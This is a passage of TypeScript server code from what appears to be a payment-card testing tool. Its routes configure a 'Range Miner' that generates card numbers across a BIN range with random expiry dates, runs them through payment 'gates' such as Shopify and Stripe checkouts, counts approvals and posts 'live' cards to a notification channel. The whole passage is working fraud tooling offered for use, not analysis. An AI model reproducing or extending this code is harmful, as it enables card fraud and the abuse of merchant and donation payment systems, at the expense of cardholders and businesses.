    for (const bin of parsed) {
      if (!existing.has(bin)) { existing.add(bin); added++; }
    }
    const list = Array.from(existing);
    const updated = await storage.updateMinerConfig({ binList: list as any });
    res.json({ binList: (updated.binList as string[]) || [], added, duplicates: parsed.length - added });
  });

  app.delete("/api/miner/bins/all", async (_req, res) => {
    const updated = await storage.updateMinerConfig({ binList: [] as any });
    res.json({ binList: [] });
  });

  // ─── Range Miner API ──────────────────────────────────────────────────────
  const fs = await import("fs");
  const path = await import("path");
  const MINE_STATE_FILE = path.join(process.cwd(), "data", ".mine-config.json");

  function loadMineConfig(): any {
    try {
      if (fs.existsSync(MINE_STATE_FILE)) {
        return JSON.parse(fs.readFileSync(MINE_STATE_FILE, "utf8"));
      }
    } catch { /* fall through */ }
    return { startBin: "", endBin: "", extraBins: [], month: "random", year: "random", typeFilter: "all", gateId: "random", delaySecs: 3, maxCardsPerBin: 50, notifyEnabled: true, totalTried: 0, totalApproved: 0, isRunning: false };
  }

  function saveMineConfig(cfg: any): void {
    try {
      const dir = path.dirname(MINE_STATE_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(MINE_STATE_FILE, JSON.stringify(cfg, null, 2), { mode: 0o600 });
    } catch (e: any) {
      console.error(`[mine] failed to save config: ${e?.message ?? e}`);
    }
  }

  app.get("/api/mine", async (_req, res) => {
    const cfg = loadMineConfig();
    cfg.isRunning = isRangeMinerRunning();
    // Resolve gate name
    if (cfg.gateId && cfg.gateId !== "random") {
      const g = await storage.getGateConfig(cfg.gateId);
      cfg.gateName = g ? g.name : null;
    } else {
      cfg.gateName = cfg.gateId === "random" ? "Random" : null;
    }
    res.json(cfg);
  });

  app.put("/api/mine", async (req, res) => {
    const cfg = loadMineConfig();
    const { startBin, endBin, month, year, typeFilter, gateId, delaySecs, maxCardsPerBin, notifyEnabled } = req.body;
    if (startBin !== undefined) cfg.startBin = String(startBin).replace(/\D/g, "");
    if (endBin !== undefined)   cfg.endBin = String(endBin).replace(/\D/g, "");
    if (month !== undefined)    cfg.month = String(month).toLowerCase() === "random" ? "random" : String(month).padStart(2, "0");
    if (year !== undefined)     cfg.year = String(year).toLowerCase() === "random" ? "random" : String(year);
    if (typeFilter !== undefined) cfg.typeFilter = ["all", "credit", "prepaid", "debit"].includes(typeFilter) ? typeFilter : "all";
    if (gateId !== undefined)   cfg.gateId = String(gateId);
    if (delaySecs !== undefined) cfg.delaySecs = Math.max(1, Math.min(60, Number(delaySecs)));
    if (maxCardsPerBin !== undefined) cfg.maxCardsPerBin = Math.max(1, Math.min(500, Number(maxCardsPerBin)));
    if (notifyEnabled !== undefined) cfg.notifyEnabled = Boolean(notifyEnabled);
    saveMineConfig(cfg);
    res.json(cfg);
  });

  app.post("/api/mine/start", async (_req, res) => {
    const cfg = loadMineConfig();
    if (!cfg.startBin || !cfg.endBin) return res.status(400).json({ message: "Set a BIN range first" });
    if (isRangeMinerRunning()) return res.status(400).json({ message: "Range miner already running" });
    cfg.isRunning = true;
    cfg.totalTried = 0;
    cfg.totalApproved = 0;
    saveMineConfig(cfg);

    const result = await startRangeMiner({
      startBin: cfg.startBin, endBin: cfg.endBin, extraBins: cfg.extraBins || [],
      month: cfg.month, year: cfg.year, typeFilter: cfg.typeFilter || "all",
      gateId: cfg.gateId, delaySecs: cfg.delaySecs, maxCardsPerBin: cfg.maxCardsPerBin,
      notifyEnabled: cfg.notifyEnabled,
    }, (card, hitResult, gateName, gateId) => {
      notifyLiveCardToChannel(card, hitResult, gateName, "range-miner", gateId);
    });

    if (!result.ok) {
      cfg.isRunning = false;
      saveMineConfig(cfg);
      return res.status(400).json({ message: result.reason ?? "Cannot start" });
    }
    res.json({ ok: true });
  });

  app.post("/api/mine/stop", async (_req, res) => {
    await stopRangeMiner();
    const cfg = loadMineConfig();
    cfg.isRunning = false;
    saveMineConfig(cfg);
    res.json({ ok: true });
  });

  app.post("/api/mine/bin", async (req, res) => {
    const { bin } = req.body;
    const cleaned = String(bin || "").replace(/\D/g, "");
    if (cleaned.length < 4 || cleaned.length > 16) return res.status(400).json({ message: "BIN must be 4-16 digits" });
    const cfg = loadMineConfig();
    if (!cfg.extraBins) cfg.extraBins = [];
    if (cfg.extraBins.includes(cleaned)) return res.status(409).json({ message: "BIN already in list" });
    cfg.extraBins.push(cleaned);
    saveMineConfig(cfg);
    res.json({ extraBins: cfg.extraBins });
  });

  app.delete("/api/mine/bin", async (req, res) => {
    const { bin } = req.body;
    const cleaned = String(bin || "").replace(/\D/g, "");
    const cfg = loadMineConfig();
    const before = (cfg.extraBins || []).length;
    cfg.extraBins = (cfg.extraBins || []).filter((b: string) => b !== cleaned);
    saveMineConfig(cfg);
    res.json({ extraBins: cfg.extraBins, removed: cfg.extraBins.length < before });
  });

  return httpServer;
}

// Derived from the GATE_TYPES single source of truth — keeps the dashboard
// dropdown (/api/gates/types) and the POST /api/gates auto-fill consistent.
// Previously had its own map that drifted (was missing shopify + payeezy and
// out of sync with the dashboard list on wp_full_stripe / givewp_v3).
function getSubTypes(gateType: string): string[] {
  const entry = GATE_TYPES.find(t => t.id === gateType.toLowerCase());
  return entry ? [...entry.subtypes] : ["standard"];
}
